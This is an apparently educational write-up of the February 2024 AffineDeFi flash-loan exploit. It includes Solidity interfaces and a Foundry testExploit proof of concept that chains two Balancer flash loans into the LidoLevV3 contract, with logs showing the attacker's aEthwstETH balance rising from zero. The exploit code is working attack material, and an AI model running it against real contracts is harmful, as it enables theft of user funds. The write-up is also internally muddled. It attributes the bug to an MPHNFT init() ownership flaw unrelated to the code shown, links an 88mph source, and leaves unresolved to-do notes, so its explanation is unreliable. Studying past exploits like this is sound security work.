
# AffineDeFi


## What's AffineDeFi?

## Amount stolen
~$88K USD

Feb 1, 2024

## Vulnerability
Flash loan attack



## Analysis

In the MPHNFT contract, there was a vulnerability present in 
init() function, which allowed any user to claim ownership of the contract. 

### Exploited code



IFlashLoanRecipient.sol
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity =0.8.16;

import {ERC20} from "solmate/src/tokens/ERC20.sol";

interface IFlashLoanRecipient {
    /**
     * @dev When `flashLoan` is called on the Vault, it invokes the `receiveFlashLoan` hook on the recipient.
     *
     * At the time of the call, the Vault will have transferred `amounts` for `tokens` to the recipient. Before this
     * call returns, the recipient must have transferred `amounts` plus `feeAmounts` for each token back to the
     * Vault, or else the entire flash loan will revert.
     *
     * `userData` is the same value passed in the `IVault.flashLoan` call.
     */
    function receiveFlashLoan(
        ERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}
```



```solidity
    /// @notice Callback called by balancer vault after flashloan is initiated.
    function _flashLoan(uint256 amount, LoanType loan, address recipient) internal {
        ERC20[] memory tokens = new ERC20[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        BALANCER.flashLoan({
            recipient: IFlashLoanRecipient(address(this)),
            tokens: tokens,
            amounts: amounts,
            userData: abi.encode(loan, recipient)
        });
    }
```

LidoLevV3.sol
```solidity
   /// @notice The different reasons for a flashloan.
    enum LoanType {
        invest,
        divest,
        upgrade,
        incLev,
        decLev
    }
```


# proof of concept (PoC) 


### first flash loan:
-  `flashloan` is called with `amount[0] = 318973831042619036856`
- The Balancer pool initiates a flash loan of WETH to the `LidoLevV3` contract, using the specified `userencodeData` #todo whats that

### LidoLevV3 (`receiveFlashLoan` function):
- The `LidoLevV3` contract receives the flash loan.
- The `LoanType.invest` case is triggered in the `receiveFlashLoan` function.
- `_addToPosition` is called, which involves borrowing WETH, converting it to wstETH, depositing in AAVE, and borrowing again.

### Second Flash Loan:
- `flashloan` is called wiht `amount2[0] = 0`.
- The Balancer pool initiates a flash loan of 0 WETH to the `LidoLevV3` contract,
- using the specified `userencodeData2`. #todo whats that

### LidoLev3 (`receiveFlashLoan` function):
- The `LidoLevV3` contract receives the second flash loan.
- The `LoanType.declev` case is triggered in the `receiveFlashLoan` function.
- `_endPosition` is called, which involves repaying debt in AAVE, unlocking collateral and converting it back to ETH.

```solidity

 function testExploit() external {
        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance before attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );

        bytes memory userencodeData = abi.encode(1, address(this));
        bytes memory userencodeData2 = abi.encode(2, address(this));
        uint256[] memory amount = new uint256[](1);
        uint256[] memory amount2 = new uint256[](1);
        IERC20[] memory token = new IERC20[](1);

        token[0] = IERC20(WETH);
        amount[0] = 318973831042619036856;
        amount2[0] = 0;
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount, userencodeData);
        IBalancer(Balancer).flashLoan(IFlashLoanRecipient(LidoLevV3), token, amount2, userencodeData2);

        emit log_named_decimal_uint(
            "Exploiter aEthwstETH balance after attack",
            IERC20(aEthwstETH).balanceOf(address(this)),
            IERC20(aEthwstETH).decimals()
        );
    }
```


### Balance Check:

Logs:
```
  Exploiter aEthwstETH balance before attack: 0.000000000000000000
  Exploiter aEthwstETH balance after attack: 33.698806193381635860
```

### Funds Movement Analysis:
- The first flash loan involves borrowing WETH, leveraging it in the `LidoLevV3` contract, and repaying the flash loan.
- The second flash loan involves repaying the flash loan without borrowing additional funds.


### Conclusion
While the first flash loan involved leveraging and borrowing funds,
the second flash loan aimed at repaying the flash loan without additional borrowing.
The funds moved within the LidoLevV3 contract during the flash loan transactions. 
The contract logs the balance of aEthwstETH before and after the flash loan attacks.

**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
